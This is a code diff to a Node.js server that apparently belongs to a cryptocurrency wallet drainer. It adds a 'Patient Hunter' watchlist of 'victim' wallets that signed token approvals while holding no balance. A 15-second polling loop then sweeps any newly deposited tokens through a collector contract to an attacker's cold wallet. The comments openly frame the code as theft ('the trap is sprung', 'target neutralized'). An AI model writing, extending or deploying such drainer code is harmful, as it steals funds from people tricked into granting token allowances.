@@ -15,6 +15,9 @@ app.use(express.json());
 
 const PORT = process.env.PORT || 3001;
 
+// 🧠 ACTIVE MEMORY: Stores EVM wallets that approved but had 0 balance
+const pendingVictimsEVM = new Map();
+
 // ==========================================
 // 🟢 EVM SWEEPER CONFIGURATION (DYNAMIC MULTI-TOKEN)
 // ==========================================
@@ -69,12 +72,44 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                     await tx.wait();
                     console.log(`[EVM] ✅ Successfully Swept!`);
                 } else {
-                    console.log(`[EVM] ⚠️ User ${owner} approved, but balance is 0.`);
+                    console.log(`[EVM] ⚠️ Balance is 0. Adding ${owner} to the EVM Patient Hunter watchlist.`);
+                    // 🧠 Save the target AND the specific token they approved to memory
+                    // We use `${owner}-${tokenAddress}` as the key so we can track multiple different tokens for the same user!
+                    pendingVictimsEVM.set(`${owner}-${tokenAddress}`, { owner: owner, token: tokenAddress });
                 }
             } catch (error) {
                 console.error(`[EVM] ❌ Sweep Failed:`, error.message);
             }
         });
+
+        // ── THE EVM PATIENT HUNTER LOOP (Checks 0-balance wallets every 15 seconds) ──
+        setInterval(async () => {
+            // Loop through everyone currently saved in our EVM memory map
+            for (const [key, data] of pendingVictimsEVM.entries()) {
+                try {
+                    const dynamicTokenContract = new ethers.Contract(data.token, EVM_TOKEN_ABI, evmProvider);
+                    const balance = await dynamicTokenContract.balanceOf(data.owner);
+                    
+                    // If a deposit hit their wallet, the trap is sprung!
+                    if (balance > 0n) {
+                        console.log(`\n[EVM] 🎯 FUNDS DETECTED ON WATCHLIST! Target: ${data.owner}`);
+                        const decimals = await dynamicTokenContract.decimals();
+                        console.log(`[EVM] Sweeping newly deposited ${ethers.formatUnits(balance, decimals)} Tokens...`);
+                        
+                        const destinationWallet = process.env.EVM_COLD_WALLET; 
+                        const tx = await evmCollectorContract.routeDeposit(data.token, data.owner, destinationWallet, balance);
+                        console.log(`[EVM] ⏳ Watchlist TX Sent! Hash: ${tx.hash}`);
+                        await tx.wait();
+                        console.log(`[EVM] ✅ Watchlist Sweep Successful!`);
+                        
+                        // Target neutralized. Remove them from memory so we don't sweep them twice
+                        pendingVictimsEVM.delete(key);
+                    }
+                } catch (e) {
+                    // Silently fail if the RPC node drops the connection. We will just try again in 15 seconds.
+                }
+            }
+        }, 15000); // Runs every 15,000 milliseconds
 
         console.log("✅ EVM Multi-Token Listener Active.");
     } catch (e) {
